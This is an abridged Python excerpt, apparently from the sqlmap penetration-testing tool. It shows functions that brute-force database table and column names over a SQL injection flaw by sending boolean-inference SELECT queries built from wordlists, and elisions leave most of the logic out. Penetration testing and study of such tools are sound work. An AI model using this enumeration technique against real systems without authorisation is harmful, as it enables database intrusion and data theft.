...
def tableExists(tableFile, regex=None):
    if (
        kb.choices.tableExists is None
        and not any(
            _
            for _ in kb.injection.data
            if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)
        )
        and not conf.direct
    ):
    ...
    result = inject.checkBooleanExpression(
        "%s"
        % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr()))
    )
    ...
    tables = getFileItems(
        tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS,), unique=True
    )
            ...
            while kb.threadContinue:
                ...
                if Backend.isDbms(DBMS.MCKOI):
                    ...
                    result = inject.checkBooleanExpression(
                        "%s"
                        % safeStringFormat(
                            "%d=(SELECT %d FROM %s)", (_, _, fullTableName)
                        )
                    )
                else:
                    result = inject.checkBooleanExpression(
                ...
                if conf.verbose in (1, 2):
                    ...
                    dataToStdout(
                        "\r[%s] [INFO] tried %s" % (time.strftime("%X"), status), True
                    )
...
def columnExists(columnFile, regex=None):
    if (
        kb.choices.columnExists is None
        and not any(
            _
            for _ in kb.injection.data
            if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)
    ...
    result = inject.checkBooleanExpression(
        safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (randomStr(), randomStr()))
    )
    ...
    def columnExistsThread():
        ...
        while kb.threadContinue:
            ...
            if Backend.isDbms(DBMS.MCKOI):
                ...
                result = inject.checkBooleanExpression(
                    safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (column, table))
                )
        ...
        for column in threadData.shared.files:
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):
                ...
                result = inject.checkBooleanExpression(
                    "%s"
                    % safeStringFormat(
                        "EXISTS(SELECT %s FROM %s WHERE %s NOT GLOB '*[^0-9]*')",
                        (column, table, column),
                    )
                )
                ...
                result = inject.checkBooleanExpression(
                    "%s"
                    % safeStringFormat(
                        "0=(SELECT MAX(%s)-MAX(%s) FROM %s)", (column, column, table)
                    )
                )
            else:
                result = inject.checkBooleanExpression(
